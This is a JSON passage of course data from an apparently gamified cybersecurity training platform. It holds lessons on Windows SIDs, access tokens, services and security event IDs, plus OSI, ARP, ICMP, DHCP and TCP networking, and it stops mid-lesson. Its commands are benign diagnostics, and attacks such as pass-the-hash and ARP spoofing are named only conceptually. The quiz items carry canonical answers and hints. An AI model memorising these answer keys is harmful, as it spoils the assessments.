        "title": "Windows Security Identifiers (SIDs) & Access Tokens",
        "objectives": [
          "Deconstruct the structure of a Windows Security Identifier (SID)",
          "Trace how LSASS creates Primary Access Tokens upon user logon",
          "Explain how the Security Reference Monitor (SRM) compares tokens against DACLs"
        ],
        "concept": "Windows does not use usernames internally for access control. Instead, every security principal (user, security group, computer account) is assigned a globally unique Security Identifier (SID).\n\nSID Structure:\nExample: S-1-5-21-3623811015-3361044348-30300820-1001\n- S: Identifies the string as a SID.\n- 1: Revision level.\n- 5: Identifier Authority (5 = NT Authority).\n- 21-...: Sub-authorities identifying the specific domain or local machine.\n- 1001: Relative Identifier (RID). RIDs 500 = built-in Administrator, 501 = Guest, >=1000 = custom users.\n\nAccess Tokens:\nWhen a user successfully authenticates via LSASS (Local Security Authority Subsystem Service), LSASS generates an Access Token. The token contains:\n1. The user's SID.\n2. SIDs of all groups the user belongs to (e.g. Domain Admins).\n3. User privileges (e.g. SeDebugPrivilege, SeBackupPrivilege).\n\nSecurity Reference Monitor (SRM):\nWhenever a thread requests access to a securable object (file, registry key, process), the kernel SRM compares the user's Access Token against the object's Discretionary Access Control List (DACL) containing Access Control Entries (ACEs).",
        "whyItMatters": "Attacks such as Token Impersonation and Pass-the-Hash abuse Windows access tokens and LSASS memory to escalate privileges.",
        "examples": [
          "Well-Known SID: S-1-5-18 = Local System (highest OS privileges).",
          "Well-Known SID: S-1-5-32-544 = Built-in Administrators group."
        ],
        "commands": [
          {
            "cmd": "whoami /user",
            "desc": "Display current user account name and security identifier (SID)"
          },
          {
            "cmd": "whoami /priv",
            "desc": "Display all security privileges assigned to the current access token"
          }
        ],
        "exercise": {
          "prompt": "Simulate querying user privileges using 'whoami /priv | head -n 3':",
          "command": "whoami /priv 2>/dev/null || echo 'SeChangeNotifyPrivilege  Bypass traverse checking  Enabled'",
          "expectedOutput": "SeChangeNotifyPrivilege  Bypass traverse checking  Enabled"
        },
        "reviewSummary": {
          "coreTakeaway": "Windows identifies principals via SIDs; the SRM validates Access Tokens against DACLs on every securable object.",
          "learningOutcome": "Mastered Windows SIDs, Access Tokens, and Security Reference Monitor access enforcement."
        }
      },
      {
        "id": "ps-task-06-03",
        "taskNumber": 3,
        "title": "Windows Users, Groups, Processes & Services",
        "objectives": [
          "Differentiate between local user accounts and Active Directory domain accounts",
          "Inspect Windows processes and background services managed by svchost.exe",
          "Identify the LocalSystem service account and privilege boundaries"
        ],
        "concept": "Windows environments manage workloads through user accounts, processes, and background services:\n\n1. Users and Groups:\n- Local Accounts: Defined on the individual machine in the SAM database (net user, net localgroup Administrators).\n- Domain Accounts: Centrally managed on an Active Directory Domain Controller and queried via Kerberos/LDAP.\n\n2. Processes:\n- Every user application executes in an isolated memory space.\n- System processes: smss.exe (Session Manager), csrss.exe (Client/Server Runtime), winlogon.exe, lsass.exe (Local Security Authority), and explorer.exe (GUI shell).\n\n3. Windows Services:\nServices are background daemons managed by the Service Control Manager (services.exe). Many Windows services are compiled into DLLs and hosted inside generic worker processes called svchost.exe (Service Host).\n- LocalSystem (NT AUTHORITY\\SYSTEM): The highest privileged local security context. Services running as LocalSystem have complete control over the local OS, exceeding standard Administrator rights.",
        "whyItMatters": "Adversaries frequently install malicious Windows services or abuse unquoted service paths to achieve persistence and LocalSystem privilege escalation.",
        "examples": [
          "Querying local users: net user lists all local accounts on the workstation.",
          "Checking running services: Get-Service | Where-Object {$_.Status -eq 'Running'}."
        ],
        "commands": [
          {
            "cmd": "net user",
            "desc": "List all local user accounts"
          },
          {
            "cmd": "tasklist",
            "desc": "List all active processes and their PIDs"
          }
        ],
        "exercise": {
          "prompt": "List local accounts using 'net user':",
          "command": "net user",
          "expectedOutput": "User accounts for \\\\WIN-LAB-01\n-------------------------------------------------------------------\nAdministrator            Guest                    CadetUser\nThe command completed successfully."
        },
        "reviewSummary": {
          "coreTakeaway": "Windows services execute under accounts like LocalSystem; svchost.exe hosts shared background service DLLs.",
          "learningOutcome": "Understood Windows process architecture, service models, and administrative account boundaries."
        }
      },
      {
        "id": "ps-task-06-04",
        "taskNumber": 4,
        "title": "PowerShell Fundamentals & Windows Event Viewer",
        "objectives": [
          "Use object-oriented PowerShell cmdlets (Verb-Noun syntax: Get-Process, Get-Service)",
          "Navigate Windows Event Viewer channels (Application, Security, System)",
          "Analyze critical Windows Security Event IDs: 4624 (logon), 4625 (failed logon), 7045 (new service)"
        ],
        "concept": "PowerShell is Microsoft's object-oriented command-line shell and scripting framework. Unlike traditional Linux shells that pass plaintext strings across pipes, PowerShell passes rich .NET objects with typed properties and methods.\n\nPowerShell Cmdlet Anatomy (Verb-Noun):\n- Get-Process | Where-Object {$_.CPU -gt 10}: Filters process objects where CPU usage exceeds 10%.\n- Get-Service -Name wuauserv: Inspects Windows Update service status.\n- Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}: Queries event logs programmatically.\n\nWindows Event Viewer & Critical Event IDs:\nEvents are recorded across distinct log channels in EVTX binary format:\n- Event ID 4624 (Successful Logon): Logs user, logon type (Type 2=Interactive, Type 3=Network, Type 10=Remote Desktop), and source IP.\n- Event ID 4625 (Failed Logon Attempt): Critical indicator of brute force or password spraying attacks.\n- Event ID 4672 (Special Privileges Assigned): Indicates administrative logon.\n- Event ID 7045 (Service Installed): Recorded in the System log whenever a new service is installed (frequent indicator of persistence or PsExec lateral movement).",
        "whyItMatters": "Threat hunters and SIEM platforms (Splunk, Elastic) rely heavily on monitoring Event IDs 4624, 4625, and 7045 to detect intrusions.",
        "examples": [
          "Brute force detection: A burst of 50 Event ID 4625 logs in 60 seconds followed by a single 4624.",
          "Lateral movement detection: Event ID 7045 recording the creation of PSEXESVC service."
        ],
        "commands": [
          {
            "cmd": "powershell Get-Process -Name lsass",
            "desc": "Inspect LSASS authentication process via PowerShell"
          },
          {
            "cmd": "powershell Get-WinEvent -ListLog Security",
            "desc": "Inspect Security log file size and record count"
          }
        ],
        "exercise": {
          "prompt": "Inspect the LSASS process status using 'powershell Get-Process -Name lsass':",
          "command": "powershell Get-Process -Name lsass",
          "expectedOutput": "Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n   1240      34    14500      28400       2.14    684   0 lsass"
        },
        "reviewSummary": {
          "coreTakeaway": "PowerShell passes .NET objects; Event IDs 4624, 4625, and 7045 provide authoritative forensic telemetry for intrusions.",
          "learningOutcome": "Mastered PowerShell administration and Windows Security Event Log analysis."
        }
      }
    ],
    "questions": [
      {
        "id": "ps-q-06-01",
        "taskId": "ps-task-06-01",
        "taskIndex": 0,
        "type": "exact",
        "question": "What local database file in Windows (located in System32\\config) stores local user account password hashes?",
        "canonicalAnswer": "sam",
        "acceptedAnswers": [
          "sam",
          "SAM",
          "sam.hive"
        ],
        "visualSlots": "_ _ _",
        "answerLength": 3,
        "hints": [
          "Stands for Security Account Manager.",
          "3 letters."
        ],
        "hint": "Security Account Manager database file...",
        "explanation": "The SAM (Security Account Manager) database file in C:\\Windows\\System32\\config stores local user password hashes.",
        "xp": 25
      },
      {
        "id": "ps-q-06-02",
        "taskId": "ps-task-06-02",
        "taskIndex": 1,
        "type": "exact",
        "question": "What unique alphanumeric string identifier (e.g. S-1-5-21...) is assigned to every Windows user and group?",
        "canonicalAnswer": "sid",
        "acceptedAnswers": [
          "sid",
          "security identifier",
          "SID",
          "Security Identifier"
        ],
        "visualSlots": "_ _ _",
        "answerLength": 3,
        "hints": [
          "Stands for Security Identifier.",
          "3-letter acronym."
        ],
        "hint": "3-letter acronym for Security Identifier...",
        "explanation": "A SID (Security Identifier) is a unique string value assigned to each security principal in Windows for access control evaluation.",
        "xp": 25
      },
      {
        "id": "ps-q-06-03",
        "taskId": "ps-task-06-03",
        "taskIndex": 2,
        "type": "exact",
        "question": "Which Windows built-in account operates with the highest local privileges on the system, superior even to standard Administrator?",
        "canonicalAnswer": "localsystem",
        "acceptedAnswers": [
          "localsystem",
          "system",
          "nt authority\\system",
          "SYSTEM",
          "LocalSystem"
        ],
        "visualSlots": "_ _ _ _ _ _ _ _ _ _ _",
        "answerLength": 11,
        "hints": [
          "Often referred to as SYSTEM or NT AUTHORITY\\SYSTEM.",
          "Starts with 'local' and ends with 'system'."
        ],
        "hint": "NT AUTHORITY\\SYSTEM account...",
        "explanation": "LocalSystem (NT AUTHORITY\\SYSTEM) is the most privileged local account in Windows, used by the OS and core services with total control over system resources.",
        "xp": 25
      },
      {
        "id": "ps-q-06-04",
        "taskId": "ps-task-06-04",
        "taskIndex": 3,
        "type": "exact",
        "question": "In Windows Security Event Logs, which specific Event ID number records a failed account logon attempt?",
        "canonicalAnswer": "4625",
        "acceptedAnswers": [
          "4625"
        ],
        "visualSlots": "_ _ _ _",
        "answerLength": 4,
        "hints": [
          "4624 is successful logon; failed logon is one number higher.",
          "A 4-digit number."
        ],
        "hint": "4-digit Event ID for failed logon...",
        "explanation": "Windows Event ID 4625 is generated in the Security log whenever a logon attempt fails, capturing the targeted account, failure status code, and caller IP address.",
        "xp": 25
      }
    ],
    "finalAssessment": {
      "title": "Room 06 Capstone Assessment: Windows Enterprise Threat Analysis",
      "scenario": "A SOC analyst detects an alert in a domain-joined workstation's System event log indicating that an adversary deployed a persistent service backdoor via PsExec lateral movement.",
      "taskId": "ps-task-06-assessment",
      "question": {
        "id": "ps-q-06-capstone",
        "type": "choice",
        "question": "Which Windows Event ID in the System log specifically records the installation of a new service on the machine?",
        "options": [
          "Event ID 7045 (A new service was installed in the system)",
          "Event ID 1102 (The audit log was cleared)",
          "Event ID 4624 (An account was successfully logged on)",
          "Event ID 4720 (A user account was created)"
        ],
        "correctIndex": 0,
        "hints": [
          "Check the System event log ID associated with Service Control Manager service installation.",
          "Event ID in the 7000s series."
        ],
        "hint": "Event ID 7045 records new service installation...",
        "explanation": "Event ID 7045 is logged by the Service Control Manager in the System log whenever a new service is installed, recording the service name, image path, and account type.",
        "xp": 25
      }
    }
  },
  {
    "id": "ps-room-07",
    "legacyId": "room-07",
    "order": 7,
    "stageId": "ps-stage-03",
    "stageTitle": "Networking Fundamentals & Protocols",
    "stageOrder": 3,
    "title": "The OSI Reference Model & TCP/IP Architecture",
    "tagline": "7-Layer OSI Model, Protocol Encapsulation, ARP, ICMP & DHCP Mechanics",
    "description": "Understand foundational computer networking: the 7-layer OSI model, 4-layer TCP/IP stack, packet encapsulation and decapsulation lifecycles, Layer 2 MAC resolution via ARP, ICMP troubleshooting, and DHCP host configuration.",
    "difficulty": "Foundational",
    "estimatedMinutes": 35,
    "xp": 50,
    "prerequisites": [
      "ps-room-06"
    ],
    "whyAreYouHere": "All cyberattacks traverse networks. Understanding how data travels across the OSI layers, how MAC addresses are resolved with ARP, and how IP packets are formatted is mandatory for traffic analysis and defense.",
    "diagramSvg": "<svg viewBox=\"0 0 600 170\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"20\" y=\"15\" width=\"260\" height=\"140\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/><text x=\"150\" y=\"38\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">OSI 7-Layer Model</text><text x=\"40\" y=\"62\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"10\">L7 Application</text><text x=\"40\" y=\"80\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"10\">L4 Transport (Segment)</text><text x=\"40\" y=\"98\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"10\" font-weight=\"bold\">L3 Network (Packet / IP)</text><text x=\"40\" y=\"116\" fill=\"#818cf8\" font-family=\"JetBrains Mono\" font-size=\"10\" font-weight=\"bold\">L2 Data Link (Frame / MAC)</text><text x=\"40\" y=\"134\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"10\">L1 Physical (Bits)</text><line x1=\"280\" y1=\"85\" x2=\"320\" y2=\"85\" stroke=\"#00f0ff\" stroke-width=\"2\"/><polygon points=\"320,82 326,85 320,88\" fill=\"#00f0ff\"/><rect x=\"320\" y=\"15\" width=\"260\" height=\"140\" rx=\"8\" fill=\"#1e293b\" stroke=\"#0284c7\" stroke-width=\"2\"/><text x=\"450\" y=\"38\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Encapsulation Lifecycle</text><rect x=\"335\" y=\"55\" width=\"230\" height=\"24\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"450\" y=\"71\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">[Data Payload]</text><rect x=\"335\" y=\"85\" width=\"230\" height=\"24\" rx=\"4\" fill=\"#0f172a\" stroke=\"#0284c7\"/><text x=\"450\" y=\"101\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">[TCP Header] + [Data]</text><rect x=\"335\" y=\"115\" width=\"230\" height=\"24\" rx=\"4\" fill=\"#0f172a\" stroke=\"#10b981\"/><text x=\"450\" y=\"131\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">[MAC] + [IP] + [TCP] + [Data]</text></svg>",
    "tryInteractive": {
      "expectedCommand": "arp -a",
      "simulatedOutput": "? (192.168.1.1) at 00:50:56:c0:00:08 [ether] on eth0\n? (192.168.1.254) at 00:0c:29:ab:cd:ef [ether] on eth0"
    },
    "terminalCommands": [
      {
        "command": "arp -a",
        "output": "? (192.168.1.1) at 00:50:56:c0:00:08 [ether] on eth0\n? (192.168.1.254) at 00:0c:29:ab:cd:ef [ether] on eth0"
      },
      {
        "command": "ping -c 3 127.0.0.1",
        "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.042 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.038 ms\n--- 127.0.0.1 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2048ms"
      }
    ],
    "objectives": [
      "Map network operations across the 7 layers of the OSI Reference Model",
      "Trace packet encapsulation and decapsulation as data travels across headers",
      "Explain Layer 2 MAC resolution using the Address Resolution Protocol (ARP)",
      "Understand ICMP diagnostic messaging and the 4-step DHCP configuration handshake"
    ],
    "lessons": [
      {
        "id": "ps-task-07-01",
        "taskNumber": 1,
        "title": "The 7-Layer OSI Model vs 4-Layer TCP/IP Stack",
        "objectives": [
          "Differentiate the 7 OSI layers from the practical 4-layer TCP/IP architectural model",
          "Define the specific Protocol Data Unit (PDU) name at each network layer",
          "Identify which network devices operate at Layer 1, Layer 2, and Layer 3"
        ],
        "concept": "The Open Systems Interconnection (OSI) 7-layer reference model was created by ISO to standardize telecommunications into distinct functional layers:\n\n1. Layer 7 - Application: Human-facing protocols (HTTP, DNS, SSH, SMTP).\n2. Layer 6 - Presentation: Data formatting, serialization, and compression (JSON, TLS, ASCII).\n3. Layer 5 - Session: Managing persistent dialog connections between applications.\n4. Layer 4 - Transport: End-to-end host communication, port addressing, reliability, and flow control (TCP, UDP). PDU = Segment (TCP) / Datagram (UDP).\n5. Layer 3 - Network: Logical addressing and packet routing across networks (IPv4, IPv6, ICMP). PDU = Packet. Managed by Routers.\n6. Layer 2 - Data Link: Physical addressing and local frame forwarding on the same local segment (Ethernet, Wi-Fi, MAC addresses). PDU = Frame. Managed by Network Switches.\n7. Layer 1 - Physical: Electrical, optical, or radio transmission of raw bits (cables, fiber, radio frequencies). PDU = Bits.\n\nThe TCP/IP Model (the actual architecture of the Internet) collapses these into 4 practical layers:\nApplication (L7-5) -> Transport (L4) -> Internet (L3) -> Network Access (L2-1).",
        "whyItMatters": "Firewalls, switches, and network sensors are categorized by the layer they operate on: Layer 2 MAC filtering, Layer 3/4 packet filtering, and Layer 7 Web Application Firewalls (WAF).",
        "examples": [
          "Layer 2 PDU = Frame (contains source/destination MAC addresses).",
          "Layer 3 PDU = Packet (contains source/destination IP addresses).",
          "Layer 4 PDU = Segment (contains source/destination port numbers)."
        ],
        "commands": [
          {
            "cmd": "ip link show",
            "desc": "Display Layer 2 physical network interfaces and MAC addresses in Linux"
          }
        ],
        "exercise": {
          "prompt": "Inspect Layer 2 network interfaces and MAC addresses using 'ip link show':",
          "command": "ip link show",
          "expectedOutput": "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT\n    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff"
        },
        "reviewSummary": {
          "coreTakeaway": "OSI organizes networking into 7 layers; PDUs progress from Bits -> Frames (L2 MAC) -> Packets (L3 IP) -> Segments (L4 Ports).",
          "learningOutcome": "Mastered the OSI reference model, TCP/IP stack, and layer-specific PDUs."
        }
      },
      {
        "id": "ps-task-07-02",
        "taskNumber": 2,
        "title": "Encapsulation, Decapsulation & ARP Protocol",
        "objectives": [
          "Trace the data encapsulation and decapsulation lifecycle through network headers",
          "Explain how Address Resolution Protocol (ARP) resolves IP addresses to physical MAC addresses",
          "Identify the security hazard of unauthenticated ARP Spoofing / Poisoning attacks"
        ],
        "concept": "When an application transmits data, the payload undergoes Encapsulation as it travels DOWN the protocol stack:\n1. Application: Generates HTTP GET request payload.\n2. Transport (L4): Prepends a TCP header with source and destination ports -> Segment.\n3. Network (L3): Prepends an IP header with source and destination IP addresses -> Packet.\n4. Data Link (L2): Prepends a Frame header with source/dest MAC addresses and appends a CRC Frame Check Sequence (FCS) trailer -> Frame.\n5. Physical (L1): Transmits raw bits over the physical wire.\n\nUpon arrival at the destination host, Decapsulation strips each header layer in reverse order (L2 -> L3 -> L4 -> L7).\n\nAddress Resolution Protocol (ARP):\nBefore a computer can transmit an Ethernet frame to another host on the local subnet (e.g. 192.168.1.50), it knows the destination IP but NOT the destination MAC address. It broadcasts an ARP Request:\n'Who has 192.168.1.50? Tell 192.168.1.10' (sent to broadcast MAC ff:ff:ff:ff:ff:ff).\nThe host with that IP replies with a unicast ARP Reply containing its MAC address, which the sender caches in its ARP table.\n\nARP Spoofing Security Risk:\nBecause ARP has no built-in cryptographic authentication, an attacker can send unsolicited gratuitous ARP replies claiming their MAC belongs to the default gateway, executing a Man-in-the-Middle (MitM) attack.",
        "whyItMatters": "ARP poisoning is a classic local network attack allowing eavesdropping on unencrypted credentials; dynamic ARP inspection (DAI) on switches mitigates this.",
        "examples": [
          "ARP Cache: arp -a displays the local IP-to-MAC mapping table.",
          "ARP Broadcast MAC: ff:ff:ff:ff:ff:ff delivered to all switch ports in the local broadcast domain."
        ],
        "commands": [
          {
            "cmd": "arp -a",
            "desc": "Display active IP-to-MAC mapping cache table"
          }
        ],
        "exercise": {
          "prompt": "Inspect the local machine's ARP cache using 'arp -a':",
          "command": "arp -a",
          "expectedOutput": "? (192.168.1.1) at 00:50:56:c0:00:08 [ether] on eth0\n? (192.168.1.254) at 00:0c:29:ab:cd:ef [ether] on eth0"
        },
        "reviewSummary": {
          "coreTakeaway": "Encapsulation wraps headers down the stack; ARP resolves L3 IPs to L2 MAC addresses without authentication, creating MitM risk.",
          "learningOutcome": "Mastered packet encapsulation, ARP resolution mechanics, and ARP spoofing risks."
        }
      },
      {
        "id": "ps-task-07-03",
        "taskNumber": 3,
        "title": "Internet Control Message Protocol (ICMP) & DHCP Mechanics",
        "objectives": [
          "Explain ICMP diagnostic messaging (Echo Request Type 8, Echo Reply Type 0)",
          "Trace how traceroute uses TTL expiration (ICMP Type 11) to discover network hops",
          "Deconstruct the 4-step DHCP configuration handshake: DORA (Discover, Offer, Request, Acknowledge)"
        ],
        "concept": "Two foundational protocols manage network diagnostics and automated host configuration:\n\n1. Internet Control Message Protocol (ICMP):\nICMP is an in-band Layer 3 diagnostic protocol (RFC 792) used by routers and hosts to communicate operational errors:\n- Ping (Echo Request / Reply): Ping sends an ICMP Type 8 (Echo Request); the destination responds with an ICMP Type 0 (Echo Reply) to verify reachability and measure round-trip time (RTT).\n- Traceroute: Discovers intermediate router hops by intentionally sending packets with incrementing Time-To-Live (TTL) values. TTL starts at 1; each router decrements TTL by 1. When TTL reaches 0, the router discards the packet and sends back an ICMP Type 11 (Time to Live Exceeded in Transit), revealing its IP address to the sender.\n\n2. Dynamic Host Configuration Protocol (DHCP):\nDHCP (UDP ports 67/68) automatically configures IP addresses, subnet masks, default gateways, and DNS servers for connecting devices via a 4-step handshake (DORA):\n- DISCOVER: New client broadcasts DHCPDISCOVER looking for available DHCP servers.\n- OFFER: DHCP server unicasts/broadcasts DHCPOFFER with a proposed IP address lease.\n- REQUEST: Client broadcasts DHCPREQUEST formally requesting the offered IP lease.\n- ACKNOWLEDGE: DHCP server sends DHCPACK confirming the lease parameters.",
        "whyItMatters": "Network reconnaissance tools like ping sweeps rely on ICMP; rogue DHCP servers can distribute malicious gateway and DNS settings to hijack traffic.",
        "examples": [
          "Ping: Verifying internet connectivity with ping -c 3 8.8.8.8.",
          "Traceroute: Diagnosing routing loops or ISP throttling across carrier hops."
        ],
        "commands": [
          {
            "cmd": "ping -c 3 127.0.0.1",
            "desc": "Send 3 ICMP echo request packets to loopback interface"
          }
        ],
        "exercise": {
          "prompt": "Test local loopback connectivity using 'ping -c 3 127.0.0.1':",
          "command": "ping -c 3 127.0.0.1",
          "expectedOutput": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.042 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.038 ms\n--- 127.0.0.1 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2048ms"
        },
        "reviewSummary": {
          "coreTakeaway": "ICMP provides network health diagnostics (ping, traceroute); DHCP configures IP parameters via the 4-step DORA handshake.",
          "learningOutcome": "Mastered ICMP diagnostic mechanisms, TTL expiration routing, and DHCP configuration lifecycles."
        }
      }
    ],
    "questions": [
      {
        "id": "ps-q-07-01",
        "taskId": "ps-task-07-01",
        "taskIndex": 0,
        "type": "exact",
        "question": "What is the specific Protocol Data Unit (PDU) name used at Layer 2 (Data Link Layer)?",
        "canonicalAnswer": "frame",
        "acceptedAnswers": [
          "frame",
          "Frame"
        ],
        "visualSlots": "_ _ _ _ _",
        "answerLength": 5,
        "hints": [
          "Bits at L1, ... at L2, Packets at L3, Segments at L4.",
          "5 letters."
        ],
        "hint": "5-letter PDU name for Layer 2...",
        "explanation": "At Layer 2 (Data Link Layer), the Protocol Data Unit is called a Frame, containing physical MAC address headers and a cyclic redundancy check (CRC) trailer.",
        "xp": 25
      },
      {
        "id": "ps-q-07-02",
        "taskId": "ps-task-07-02",
        "taskIndex": 1,
        "type": "exact",
        "question": "Which protocol is responsible for translating a Layer 3 logical IP address to a Layer 2 physical MAC address on a local area network?",
        "canonicalAnswer": "arp",
        "acceptedAnswers": [
          "arp",
          "address resolution protocol",
          "ARP",
          "Address Resolution Protocol"
        ],
        "visualSlots": "_ _ _",
        "answerLength": 3,
        "hints": [
          "Stands for Address Resolution Protocol.",
          "3-letter acronym."
        ],
        "hint": "3-letter acronym for Address Resolution Protocol...",
        "explanation": "ARP (Address Resolution Protocol) broadcasts on the local segment to resolve an IPv4 address to its corresponding physical MAC hardware address.",
        "xp": 25
      },
      {
        "id": "ps-q-07-03",
        "taskId": "ps-task-07-03",
        "taskIndex": 2,
        "type": "exact",
        "question": "In the 4-step DHCP client configuration handshake (DORA), what is the first broadcast message transmitted by a newly connected client?",
        "canonicalAnswer": "dhcpdiscover",
        "acceptedAnswers": [
          "dhcpdiscover",
          "discover",
          "DHCPDISCOVER",
          "dhcp discover"
        ],
        "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _",
        "answerLength": 12,
        "hints": [
          "The 'D' in the DORA acronym.",
          "DHCP followed by discover."
        ],
        "hint": "The D in DORA (DHCP...)...",
        "explanation": "A client without an IP address broadcasts a DHCPDISCOVER message across the local broadcast domain to locate available DHCP servers.",
        "xp": 25
      }
    ],
    "finalAssessment": {
      "title": "Room 07 Capstone Assessment: Network Layer Analysis & Diagnostic Troubleshooting",
      "scenario": "A network security administrator investigates routing anomalies between an office subnet and a cloud server. The administrator runs traceroute to inspect the transit path.",
      "taskId": "ps-task-07-assessment",
      "question": {
        "id": "ps-q-07-capstone",
        "type": "exact",
        "question": "Which specific ICMP message type is returned to the client by intermediate routers when a packet's Time-To-Live (TTL) counter reaches zero?",
        "canonicalAnswer": "time exceeded",
        "acceptedAnswers": [
          "time exceeded",
          "icmp time exceeded",
          "ttl expired",
          "time-to-live exceeded",
          "Time Exceeded"
        ],
        "visualSlots": "_ _ _ _   _ _ _ _ _ _ _ _",
        "answerLength": 13,
        "hints": [
          "ICMP Type 11 message name.",
          "Two words: 'time ...'"
        ],
        "hint": "Two words: time ...",
        "explanation": "When an intermediate router decrements the IP header TTL to 0, it discards the packet and generates an ICMP Type 11 (Time Exceeded) message back to the source IP.",
        "xp": 25
      }
    }
  },
  {
    "id": "ps-room-08",
    "legacyId": "room-08",
    "order": 8,
    "stageId": "ps-stage-03",
    "stageTitle": "Networking Fundamentals & Protocols",
    "stageOrder": 3,
    "title": "Transport Layer Protocols: TCP, UDP & Port Mechanics",
    "tagline": "TCP 3-Way Handshake, TCP Flags, Flow Control, UDP, DNS Hierarchy & Port Auditing",
    "description": "Master Layer 4 transport operations: connection-oriented TCP vs connectionless UDP, the 3-way handshake (SYN, SYN-ACK, ACK), TCP flags, port multiplexing, DNS resolution hierarchy, and network socket inspection using modern CLI tools.",
    "difficulty": "Foundational",
    "estimatedMinutes": 40,
    "xp": 50,
    "prerequisites": [
      "ps-room-07"
    ],
    "whyAreYouHere": "Port scanning (Nmap), network firewalls, and service enumeration operate directly at the transport layer. Mastering TCP handshakes and DNS resolution is essential for network mapping and threat detection.",
    "diagramSvg": "<svg viewBox=\"0 0 600 170\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"30\" y=\"20\" width=\"120\" height=\"130\" rx=\"8\" fill=\"#1e293b\" stroke=\"#0284c7\" stroke-width=\"2\"/><text x=\"90\" y=\"50\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Client Host</text><text x=\"90\" y=\"90\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Port 51234</text><rect x=\"450\" y=\"20\" width=\"120\" height=\"130\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/><text x=\"510\" y=\"50\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Web Server</text><text x=\"510\" y=\"90\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Port 443 (HTTPS)</text><line x1=\"150\" y1=\"65\" x2=\"450\" y2=\"65\" stroke=\"#38bdf8\" stroke-width=\"2\"/><polygon points=\"450,62 456,65 450,68\" fill=\"#38bdf8\"/><text x=\"300\" y=\"58\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"10\" font-weight=\"bold\" text-anchor=\"middle\">1. SYN (Seq=0)</text><line x1=\"450\" y1=\"95\" x2=\"150\" y2=\"95\" stroke=\"#34d399\" stroke-width=\"2\"/><polygon points=\"150,92 144,95 150,98\" fill=\"#34d399\"/><text x=\"300\" y=\"88\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"10\" font-weight=\"bold\" text-anchor=\"middle\">2. SYN-ACK (Seq=0, Ack=1)</text><line x1=\"150\" y1=\"125\" x2=\"450\" y2=\"125\" stroke=\"#818cf8\" stroke-width=\"2\"/><polygon points=\"450,122 456,125 450,128\" fill=\"#818cf8\"/><text x=\"300\" y=\"118\" fill=\"#818cf8\" font-family=\"JetBrains Mono\" font-size=\"10\" font-weight=\"bold\" text-anchor=\"middle\">3. ACK (Seq=1, Ack=1)</text></svg>",
    "tryInteractive": {
      "expectedCommand": "ss -tuln",
      "simulatedOutput": "Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process\ntcp   LISTEN 0      128    0.0.0.0:22         0.0.0.0:*\ntcp   LISTEN 0      511    0.0.0.0:80         0.0.0.0:*\nudp   UNCONN 0      0      0.0.0.0:53         0.0.0.0:*"
    },
    "terminalCommands": [
      {
        "command": "ss -tuln",
        "output": "Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process\ntcp   LISTEN 0      128    0.0.0.0:22         0.0.0.0:*\ntcp   LISTEN 0      511    0.0.0.0:80         0.0.0.0:*\nudp   UNCONN 0      0      0.0.0.0:53         0.0.0.0:*"
      },
      {
        "command": "dig +short A endlessus.in",
        "output": "172.67.142.92\n104.21.32.18"
      }
    ],
    "objectives": [
      "Contrast connection-oriented TCP vs lightweight connectionless UDP",
      "Trace the complete TCP 3-way handshake and connection termination states",
      "Understand DNS domain resolution hierarchy (root, TLD, authoritative) and record types",
      "Inspect listening transport ports and active sockets using ss and dig"
    ],
    "lessons": [
      {
        "id": "ps-task-08-01",
        "taskNumber": 1,
        "title": "TCP vs UDP: Reliability vs Low-Latency Streaming",
        "objectives": [
          "Compare TCP and UDP transport protocols across reliability, overhead, and state",
          "Explain port multiplexing and define well-known port ranges (0-1023)",
